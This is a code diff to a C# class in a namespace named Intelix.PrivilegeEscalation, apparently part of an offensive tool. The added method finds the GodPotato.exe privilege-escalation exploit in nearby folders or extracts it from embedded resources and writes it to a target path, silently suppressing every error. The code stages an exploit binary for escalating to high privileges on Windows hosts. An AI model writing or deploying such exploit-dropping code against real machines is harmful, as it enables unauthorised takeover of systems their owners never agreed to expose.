@@ -87,5 +87,56 @@ namespace Intelix.PrivilegeEscalation
         {
             if (File.Exists(TargetPath)) return true;
 
+            try
+            {
+                // Try to find GodPotato.exe in the project root first
+                string projectRoot = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
+                string[] searchPaths = new string[]
+                {
+                    Path.Combine(projectRoot, PotatoName),
+                    Path.Combine(projectRoot, "..", PotatoName),
+                    Path.Combine(projectRoot, "..", "..", PotatoName),
+                    Path.Combine(Environment.CurrentDirectory, PotatoName),
+                };
+
+                foreach (var searchPath in searchPaths)
+                {
+                    if (File.Exists(searchPath))
+                    {
+                        File.Copy(searchPath, TargetPath, true);
+                        return true;
+                    }
+                }
+
+                // Try to extract from embedded resource
+                var assembly = Assembly.GetExecutingAssembly();
+                string[] resourceNames = assembly.GetManifestResourceNames();
+                
+                foreach (var resName in resourceNames)
+                {
+                    if (resName.EndsWith("GodPotato.exe", StringComparison.OrdinalIgnoreCase) ||
+                        resName.Contains("GodPotato"))
+                    {
+                        using (var stream = assembly.GetManifestResourceStream(resName))
+                        {
+                            if (stream != null)
+                            {
+                                using (var fs = new FileStream(TargetPath, FileMode.Create, FileAccess.Write))
+                                {
+                                    stream.CopyTo(fs);
+                                }
+                                return true;
+                            }
+                        }
+                    }
+                }
+
+                return false;
+            }
+            catch
+            {
+                return false;
+            }
+        }
     }
 }
